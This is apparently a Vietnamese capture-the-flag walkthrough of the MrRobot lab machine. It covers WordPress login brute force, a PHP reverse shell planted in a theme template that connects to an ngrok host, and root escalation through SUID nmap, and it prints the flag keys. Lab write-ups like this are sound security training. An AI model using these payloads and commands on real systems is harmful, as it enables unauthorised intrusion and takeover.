# MrRobot

Sau khi cài đặt xong, do chưa biết địa chỉ IP nên bước đầu tiên là phải xác định IP bằng cách nmap với dải mạng đã biết là 192.168.113.0/24 port 80 để xác định IP của máy MrRobot là bao nhiêu.

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%201.png)

Sau khi có địa chỉ IP, truy cập trên browser

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%202.png)

Sử dụng dirsearch để scan các file và directory

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%203.png)

Đi qua lần lượt từng file và directory, khi truy cập `/robots.txt` ta sẽ được key 1

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%204.png)

Key 1: `073403c8a58a1f80d943455fb30724b9`

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%205.png)

Khi truy cập `/fsocity.dic` sẽ download 1 file, đó là một wordlist có thể được dùng cho lúc sau.

Sử dụng nuclei để scan các CVE

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%206.png)

Truy cập trang đăng nhập /wp-login. Thấy trang web không có cơ chế rate limit ⇒ Có thể bruteforce tài khoản mật khẩu. Thử sử dụng file `fsocity.dic` lấy được ở trên. Sau 1 lúc bruteforce, nhận thấy trang web bị lỗi user enum ⇒ Ta sẽ đi tìm username trước rồi đi tìm password để giảm số lượng request tránh mất thời gian.

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%207.png)

Với username là `elliot` ta tìm được password là: `ER28-0652`

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%208.png)

Brute force 1 lúc thì nhận thấy trong wordlist đó nó có nhiều từ trùng nhau :))) Nên để nhanh hơn, cần xóa bỏ những từ trùng nhau đó bằng nhiều cách ví dụ:

```bash
sort -u fsocity.dic | uniq > fsocity1.dic
```

Giảm được rất nhiều từ trùng lặp

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%209.png)

Sau khi brute force xong thì ta vào được trang chủ của wordpress version … . Lúc này sẽ đi kiếm những CVE liên quan đến version này vì nó khá thấp rồi. Nhưng vì mình đang là admin của wordpress này rồi nên sẽ trực tiếp thay đổi source của ứng dụng này để nó reverse shell về máy luôn. Thực hiện cách revershell theo các bước sau:

- Bước 1: Lắng nghe ở port 9999 và public port này ra bên ngoài bằng ngrok
    
    ```bash
    nc -nlvp 9999
    ngrok tcp 9999
    ```
    
    ![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%2010.png)
    
    ![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%2011.png)
    
- Bước 2: Truy cập chức năng chỉnh sửa theme trên browser: `Appearance` > `Editor` > Chọn 1 trang bất kì (ví dụ 404 Template)
    
    ![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%2012.png)
    
- Bước 3: Xóa đoạn code cũ, thêm vào một đoạn như sau và chọn “Update File”
    
    ```bash
    <?php 
    system('bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/10392 0>&1"');
    ?>
    ```
    
    ![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%2013.png)
    
    Trong đó:
    
    - [0.tcp.ap.ngrok.io](http://0.tcp.ap.ngrok.io) là host ngrok gen ra
    - 10392 là port ngrok gen ra
- Bước 4: Truy cập trang 404.php bằng cách `http://192.168.113.129/wp-admin/404.php` và quan sát thấy ứng dụng đã reverse shell về máy chúng ta
    
    ![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%2014.png)
    
- Bước 5: Vì shell khi reverse về là 1 shell khá cùi, chúng ta cần tạo 1 TTY shell bằng nhiều cách tham khảo ở [đây](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)

Sau khi đã reverse shell xong chúng ta sẽ đi tìm secret thứ 2

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%2015.png)

Tìm thấy file đó nhưng chưa có quyền đọc, chỉ có user robot mới đọc được. Ta đọc file `password.raw-md5` thì thấy đây có thể là chứa password của user robot

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%2016.png)

Mang đoạn password kia đi tìm xem plaintext của nó là gì

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%2017.png)

Password: `abcdefghijklmnopqrstuvwxyz`

Lúc này login vào robot và lấy được secret thứ 2

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%2018.png)

Key 2: 822c73956184f694993bede3eb39f959

Mạnh dạn đoán secret 3 sẽ phải leo quyền lên root mới lấy được, leo quyền thì có 3 vector:

- Thứ nhất là `sudo right`
- Thứ hai là `setuid`
- Thứ ba là qua biến môi trường `PATH`

Trong trường hợp này ta sẽ đi theo hướng `setuid`, đầu tiên phải tìm được những file thực thi nào có khả năng nhất bằng cách `find / -perm -4000 2>/dev/null`. Câu lệnh này sẽ tìm tất cả những file được set SUID

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%2019.png)

Quan sát thì thấy `nmap` là có khả năng cao nhất nên quyết định sẽ thử leo quyền bằng nmap trước. Có một trang web giúp chúng ta tìm những lệnh để leo quyền lên đó là [GTFOBins](https://gtfobins.github.io/). Lúc này search nmap là ra 1 loạt

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%2020.png)

Chúng ta sẽ sử dụng đoạn này để khai thác vì nó ngắn nhất

```bash
nmap --interactive
nmap> !sh
```

Leo quyền lên root thành công thì giờ sẽ đọc secret thứ 3 nữa là xong:

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%2021.png)

Đọc secret 3

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%2022.png)

Key 3: 04787ddef27c3dee1ee161b21670b4e4

Vì bản Linux này có kernel khá thấp nên cũng có thể tìm cách leo quyền bằng các CVE khai thác kernel

![Untitled](MrRobot%206d995288f07c477eb342aa2481837baf/Untitled%2023.png)

Về phần để reverse shell thì cũng có nhiều cách đó là dùng CVE, dùng metasploit,…
